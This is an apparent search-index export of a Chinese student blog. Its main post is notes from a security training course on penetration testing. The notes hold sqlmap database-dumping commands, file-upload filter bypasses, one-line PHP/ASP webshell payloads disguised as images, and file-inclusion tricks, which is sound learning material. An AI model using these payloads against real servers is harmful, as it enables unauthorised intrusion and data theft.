[{"title":"安恒笔记","url":"http://ringfall.me/2017/07/23/安恒记录/","content":"<h2 id=\"选拔\"><a href=\"#选拔\" class=\"headerlink\" title=\"选拔\"></a>选拔</h2><p>神它喵的题目。。神它喵最高分。。神它喵队长。。<br><br>附上<a href=\"ringfall.me/anheng.docx\">野鸡题目和窝各种姿势百度的答案</a></p>\n<h2 id=\"day1\"><a href=\"#day1\" class=\"headerlink\" title=\"day1\"></a>day1</h2><h6 id=\"法律\"><a href=\"#法律\" class=\"headerlink\" title=\"法律\"></a>法律</h6><p>balabalabala…<br><br>总而言之就是要有法律意识2333一不小心就进去了<br></p>\n<h6 id=\"社工\"><a href=\"#社工\" class=\"headerlink\" title=\"社工\"></a>社工</h6><p>论如何通过各种渠道勾搭妹子或者悄咪咪视奸她的各种动态/滑稽</p>\n<h2 id=\"day2-web\"><a href=\"#day2-web\" class=\"headerlink\" title=\"day2 web\"></a>day2 web</h2><h5 id=\"书\"><a href=\"#书\" class=\"headerlink\" title=\"书\"></a>书<br></h5><p>精通脚本黑客<br>web深度解剖<br>乌云的漏洞库 8w<br>端口对应表（对每个端口的漏洞进行测试挖掘）<br></p>\n<h5 id=\"网页流程\"><a href=\"#网页流程\" class=\"headerlink\" title=\"网页流程\"></a>网页流程<br></h5><p>个人-网络-cdn-对方服务器（安全狗WAF-中间件-mysql）-网页打印<br><br>waf<br>1.木马免杀 <br> 2.个人到网络时把流量转发到本地 base64_encode(),转发到网络 中转尝试突破防护</p>\n<h5 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h5><p>黑盒/白盒/灰盒测试</p>\n<h5 id=\"渗透流程\"><a href=\"#渗透流程\" class=\"headerlink\" title=\"渗透流程\"></a>渗透流程<br></h5><h6 id=\"1-信息收集：\"><a href=\"#1-信息收集：\" class=\"headerlink\" title=\"1.信息收集：\"></a>1.信息收集：</h6><p>域名、二级域名、社工、旁站、C段<br><br>社工<br>google hacking(bing&gt;baidu)  <br>社工库 <br> 网站信息（支付宝、朋友网、淘宝个人空间）<br></p>\n<h6 id=\"2-尝试漏洞-进入内网\"><a href=\"#2-尝试漏洞-进入内网\" class=\"headerlink\" title=\"2.尝试漏洞(进入内网)\"></a>2.尝试漏洞(进入内网)<br></h6><p>端口的未授权访问（redis/memcache）<br></p>\n<h6 id=\"3-可能的问题：漏洞没打补丁\"><a href=\"#3-可能的问题：漏洞没打补丁\" class=\"headerlink\" title=\"3.可能的问题：漏洞没打补丁\"></a>3.可能的问题：漏洞没打补丁<br></h6><p>域<br></p>\n<h5 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h5><p>连续性<br><br>判断是否登录成功<br></p>\n<h6 id=\"暴力破解-burp演示\"><a href=\"#暴力破解-burp演示\" class=\"headerlink\" title=\"暴力破解(burp演示)\"></a>暴力破解(burp演示)</h6><p>sinper 单变量 单字典<br><br>battering ram 多变量 单字典<br><br>pitchfork 多变量 多字典 字典一一对应<br><br>cluster bomb 单变量 多字典 循环爆破 一对多<br><br>(注意打开302跳转)<br><br>(burp-response乱码:user options-display-font)<br></p>\n<h6 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h6><p>hydra<br>arpr<br>3389<br>pkav http fuzzer</p>\n<h6 id=\"测试一发\"><a href=\"#测试一发\" class=\"headerlink\" title=\"测试一发~\"></a>测试一发~</h6><p><a href=\"http://192.168.50.60/dvwa\" target=\"_blank\" rel=\"external\">http://192.168.50.60/dvwa</a><br>admin password</p>\n<h5 id=\"SQL注入（针对每一种数据）\"><a href=\"#SQL注入（针对每一种数据）\" class=\"headerlink\" title=\"SQL注入（针对每一种数据）\"></a>SQL注入（针对每一种数据）</h5><p>执行操作 读写操作 增删改查<br><br>编程语言接受参数<br><br>单引号-xor异或<br><br>防护软件基于黑名单验证<br><br>select * from user where id=1 xor ‘a’=’a’<br><br>浏览器处理特殊字符时转URL编码<br><br>整形/字符串注入<br><br>注释符<br><br>内联注入 1’ and ‘1’=’1<br><br>终止注入 1’ and 1=1#<br><br>畸形解析 id=(((([(变量)]))))<br><br>MSSQL 执行权限 cmdshe<br><br>MySQL 执行权限 默认不存在执行权限<br><br>数据库-表-字段-值<br></p>\n<h6 id=\"工具-1\"><a href=\"#工具-1\" class=\"headerlink\" title=\"工具\"></a>工具</h6><p>havij<br><br>sqlmap 可用python自定义编辑bypass脚本<br></p>\n<h6 id=\"acess\"><a href=\"#acess\" class=\"headerlink\" title=\"acess\"></a>acess</h6><p>sqlmap -u url –tables<br><br>sqlmap -u url -T “表名” –cloumns<br><br>sqlmap -u url -T “表名” -C “列名” –dump<br></p>\n<h6 id=\"mysql\"><a href=\"#mysql\" class=\"headerlink\" title=\"mysql\"></a>mysql</h6><p>sqlmap -u url –dbs<br><br>sqlmap -u url –tables -D “数据库”<br><br>sqlmap -u url -T “表名” -D “数据库” –cloums<br><br>sqlmap -u url -T “表名” -C “列名” -D “数据库” –dump<br><br>id=(((([(变量)]))))时 sqlmap -u url –dbs –prefix=”)]))))”<br><br>–threads=10 线程<br><br>–dbms=DBMS<br><br>有乱码或空内容<br><br>–no-cast<br><br>–hex<br><br>–charset=GBK<br><br>增加大量payload<br><br>–risk=RISK (1-3,default 1)<br><br>–level=LEVEL (1-5,default 1)<br><br>–level 1 默认检测 get post<br><br>–level 1 默认检测 get post cookie<br><br>–level 5 检测所有http头信息<br><br>–string=STRING<br><br>–code=CODE<br><br>–technique=TECH SQL injection techniques to use (default “BEUSTQ”)<br><br>–tamper 使用插件<br><br>–flush 清空缓存<br><br>post 表单提交<br><br>-r<br><br>–data<br><br>–forms<br></p>\n<h5 id=\"上传漏洞\"><a href=\"#上传漏洞\" class=\"headerlink\" title=\"上传漏洞\"></a>上传漏洞</h5><h6 id=\"js验证\"><a href=\"#js验证\" class=\"headerlink\" title=\"js验证\"></a>js验证</h6><p>目测：网页不用加载流量<br><br>删去onsubmit事件<br><br>进about:config把javascript.enabled改成false<br><br>禁用javascript<br><br>先改后缀再用burp改回去<br></p>\n<h6 id=\"MIME验证\"><a href=\"#MIME验证\" class=\"headerlink\" title=\"MIME验证\"></a>MIME验证</h6><p>content-type:image/jpeg<br><br>image/gif<br>image/png<br>image/jpeg<br>image/bmp</p>\n<h6 id=\"内容验证\"><a href=\"#内容验证\" class=\"headerlink\" title=\"内容验证\"></a>内容验证</h6><p>copy把php放在jpg后（前加个空格）<br>copy mmm.png/b+mm.php mm2.png<br><br>把php加进jpg属性中写在版权或啥里<br></p>\n<h6 id=\"服务端扩展名-后缀名-验证\"><a href=\"#服务端扩展名-后缀名-验证\" class=\"headerlink\" title=\"服务端扩展名(后缀名)验证\"></a>服务端扩展名(后缀名)验证</h6><p>操作系统 window<br><br>php.<br>php空格<br>php::$data<br>文件流特性<br><br>大小写<br><br>中间件<br>IIS 6<br><br>1.asp、cer、cdx、asa都被解析为asp文件<br><br>2.目录为1.asp则其他所有文件都解析为asp文件<br><br>3.1.asp;1.jpg 1.asp;.jpg上传成功内容为空<br><br>4.1.asp%001.jpg<br>IIS 7<br><br>fast-cgi漏洞<br><br>上传图片马 1.jpg =&gt; 1.jpg/xxx.php<br><br>nginx<br><br>上传图片马 1.jpg =&gt; 1.jpg%00xxx.php<br><br>上传图片马 1.jpg =&gt; 1.jpg/xxx.php<br></p>\n<p>light<br><br>fast-cgi漏洞<br><br>上传图片马 1.jpg =&gt; 1.jpg/xxx.php<br><br>apache<br><br>从右向左解析，如果最后的无法解析，则解析前一个<br><br>php3 php4 phpml php5 pht 基于debian/ubuntu的apt-get安装lamp<br></p>\n<h6 id=\"代码层\"><a href=\"#代码层\" class=\"headerlink\" title=\"代码层\"></a>代码层<br></h6><p>&lt;?php…..?&gt;判断文件头&lt;?php<br><br>（看php.ini）<br><br>&lt;?php … ?&gt; 默认的php代码风格<br><br>&lt;?…..?&gt; short_open_tag=on php短标签风格<br><br>&lt;%…..%&gt; asp_tags=off asp风格<br><br><code>&lt;script language=&quot;php&quot;&gt;.....&lt;/script&gt;</code> 脚本风格<br></p>\n<p>GIF89a &lt;?php eval($_POST[‘a’])?&gt; 1.jpg<br><br>GIF89a &lt;? eval($_POST[‘a’])?&gt; 2.jpg<br><br>GIF89a &lt;% eval($_POST[‘a’])%&gt; 3.jpg<br><br>GIF89a <code>&lt;script language=&quot;php&quot;&gt; eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code>  4.jpg <br><br>GIF89a &lt;% execute(request(1))%&gt; 5.jpg<br></p>\n<h6 id=\"特殊上传漏洞\"><a href=\"#特殊上传漏洞\" class=\"headerlink\" title=\"特殊上传漏洞\"></a>特殊上传漏洞<br></h6><p>目录验证上传<br><br>在A/b/c/是上传保存文件目录，存在一个脚本，判断c目录下是否存在php后缀的文件，如果存在，则删除。存在一个定义路径的变量和上传文件的变量<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">Content-Disposition: form-data; name=&quot;path&quot;</div><div class=\"line\"></div><div class=\"line\">../images</div><div class=\"line\">-----------------------------190023260920007</div><div class=\"line\">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.php&quot;</div><div class=\"line\">Content-Type: application/octet-stream</div><div class=\"line\"></div><div class=\"line\">&lt;?php</div><div class=\"line\">phpinfo();</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>修改path，导致上传路径变到b目录下，不存在检测，则绕过验证<br></p>\n<p>双文件上传<br><br>在c是上传保存文件目录，代码存在bug，可以一次上传多个文件，但是检测的时候只检测第一个上传的文件，导致了使用双文件上传直接突破<br></p>\n<h6 id=\"编辑漏洞-ewebedit-fck\"><a href=\"#编辑漏洞-ewebedit-fck\" class=\"headerlink\" title=\"编辑漏洞(ewebedit fck)\"></a>编辑漏洞(ewebedit fck)<br></h6><h5 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h5><h6 id=\"本地\"><a href=\"#本地\" class=\"headerlink\" title=\"本地\"></a>本地</h6><p>include $_GET[“file”].”tpl”;<br><br>1.%00截断 include.php?file=2.txt%00<br><br>2.window下文件名最大长度259，unix为4099。后面用…..填充可忽略<br></p>\n<p>include “test/“.$_GET[‘file’];<br><br>加../2.txt就好~<br></p>\n<p>include “test_”.$_GET[‘file’];<br><br>加/../2.txt就好~<br></p>\n<p>IIS 短标签 <br><br>&lt; === . 一个任意字符<br><br>&lt;&lt; === .* 多个任意字符<br><br>dchnjrhaufgfipHHAWKRGIORHA.txt === d&lt;&lt;<br><br>如果首个字母相同，比较第二位的ascii，读取小的，以此类推<br></p>\n<h6 id=\"远程文件包含\"><a href=\"#远程文件包含\" class=\"headerlink\" title=\"远程文件包含\"></a>远程文件包含</h6><p>allow_url_include=off（http or ftp or https）<br><br>file=php://input就可<br></p>\n<h6 id=\"伪协议\"><a href=\"#伪协议\" class=\"headerlink\" title=\"伪协议\"></a>伪协议</h6><p>?file=php://filter/convert.base64-encode/resource=xxx.php<br><br><br></p>\n","categories":[],"tags":[]},{"title":"大一总结","url":"http://ringfall.me/2017/07/22/大一总结-1/","content":"<p>Tags: [瞎几把扯]</p>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>感慨时间好快什么的应该不是窝的画风，然而不写些什么，就好像一年一年凭空划过了无痕迹，虽然自己也有知识和阅历的增长，可却像是十年不如一日，还是那个又蠢又懒的窝QAQ</p>\n<h2 id=\"0x01-搅屎棍之路\"><a href=\"#0x01-搅屎棍之路\" class=\"headerlink\" title=\"0x01 搅屎棍之路\"></a>0x01 搅屎棍之路</h2><p>能在第一天遇见师父父真的是超~幸运的事呀，那时候带路哒胖胖学长的头像还是傲娇大小姐凛，于是和文学姐聊啊聊也特别舒服2333<br><br>然后就莫名入坑啦ctf？因为师父父嗦超好玩而且可以当大黑阔~<br><br>现在想想那时真是好骗又naive，空有满脑子的YY而并不知前路艰险，毕竟无知者无畏，遑论当时自己貌似连编程是啥都不知道吧。。<br><br>不过那又有什么关系呐~懒散颓废了一个暑假的渣渣在拿到了师父父的C++书后，一时还是很有兴趣的~再加上军训真的好无聊==.就学的挺快，水群也水得挺欢。<br><br>后来大概是听从师父父“锻炼编程能力”的教导混迹于红太阳带领下的GAY…啊不不不，是ACM小组（其实只是围观顺便和徒儿儿愉快玩♂耍）也刷了一些OJ的一些水题为未来的一些实验课划水打下了基础///<br><br>然后呢，师父父剪短而零碎地教导了两三次吧，对这四年以及网络安全有了一丢丢迷迷糊糊的想法和认知，去了两次安全谷一是游玩观光(bu，二是为Appl3道长捧场~顺便记下了实训平台上某最最最简单的sql注入题的答案…还是很有收获的嗯！<br><br>寒假看了大部分的韩顺平哒世界上最好的语言——P(ai)H(uang)P(ian)视频教程（其中也有html、css，和数据库），前面部分挺有意思也很是清晰地描述了网络传输显示过程和php在网页中特殊之处（在服务器端运行出结果再返回，而别的比如html、js是直接返回到客户端再由浏览器显示），后面讲语法就觉得和C艹怎么蜜汁相像啊突然失去梦想变成咸鱼无聊刷课ing，不过好在寒假漫漫终于刷到了数据库，笔记做的那叫一个细致啊（现在看去大概都忘了QAQ）总之，这套教程看时只是零散地做了些笔记，最后在师父父督促下缭乱地写了个登录的界面算是练手。（不造为啥在寒假之前师父的最初无修的任务居然是用php写个博客，大概是太高估窝惹2333 抱紧hexo瑟瑟发抖）<br><br>寒假后期在师父父指示下糊里糊涂地用神器burp勉强瞎做了南邮平台上前两排的“提示比较明显，考点比较单一”的题。诚然看着题目颜色变了的时候有一丝丝的喜悦然而内心真的挺懵的来着。。<br><br>（先传一发，应该没人看，待续）</p>\n","categories":[],"tags":[]},{"title":"hello~ringfall~","url":"http://ringfall.me/2017/07/18/hello-ringfall/","content":"<p>chun~~~<br>yi<br></p>\n","categories":[],"tags":[]},{"title":"Hello World","url":"http://ringfall.me/2017/07/18/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"external\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"external\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"external\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"external\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"external\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo server</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"external\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo generate</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"external\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo deploy</div></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"external\">Deployment</a></p>\n","categories":[],"tags":[]},{"title":"category","url":"http://ringfall.me/category/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://ringfall.me/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://ringfall.me/tag/index.html","content":"","categories":[],"tags":[]}]